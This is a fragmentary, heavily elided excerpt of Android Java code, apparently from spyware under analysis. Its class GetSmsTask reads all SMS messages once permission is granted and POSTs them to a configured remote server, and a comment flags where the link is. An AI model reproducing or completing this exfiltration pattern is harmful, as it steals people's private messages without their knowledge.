...
public class GetSmsTask extends BaseTask {
    ...
    private void getAllSms() {
        ...
        if(ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            ...
            if (mCur.moveToFirst()) {
                do {
                    ...
                    try {
                        ...
                        String x = (commonParams.getServer() + Constants.POST_MESSAGE_URL);
                        Http smsHttp = new Http();
                        smsHttp.setMethod(HttpRequest.METHOD_POST);
                        smsHttp.setUrl(commonParams.getServer() + Constants.POST_MESSAGE_URL); //THE LINK IS HERE
          ...
          //      doneSMS.setUrl(commonParams.getServer());
